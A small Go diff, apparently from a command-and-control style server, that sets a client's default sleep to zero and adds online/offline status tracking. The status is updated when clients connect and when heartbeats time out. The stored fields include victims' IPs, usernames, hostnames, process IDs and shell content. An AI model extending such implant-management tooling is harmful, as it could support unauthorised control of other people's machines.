@@ -116,7 +116,7 @@ func HandleWebSocket(w http.ResponseWriter, r *http.Request) {
 					arch = "x64"
 				}
 
-				database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "5", Color: ""})
+				database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "0", Online: "1", Color: ""})
 				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
 				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
 			}
@@ -252,6 +252,7 @@ func checkHeartbeats(uid string) {
 				ClientTimeManager[uid].timeoutCount++
 				if ClientTimeManager[uid].timeoutCount >= 30 {
 					ClientManager[uid].Close()
+					database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
 					delete(ClientManager, uid)
 					delete(ClientTimeManager, uid)
 				}
